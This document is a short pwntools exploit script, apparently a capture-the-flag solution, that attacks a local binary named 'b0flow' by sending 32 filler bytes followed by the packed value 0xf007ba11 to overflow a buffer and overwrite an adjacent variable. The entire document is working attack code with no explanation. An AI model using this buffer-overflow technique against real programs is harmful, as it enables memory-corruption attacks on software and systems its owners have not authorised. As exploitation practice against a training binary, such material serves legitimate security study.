#!/usr/bin/python3
from pwn import *

io= process('./b0flow')
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode())
io.sendlineafter(b'>',b'A'*32 + p32(0xf007ba11))

print(io.recvall().decode())
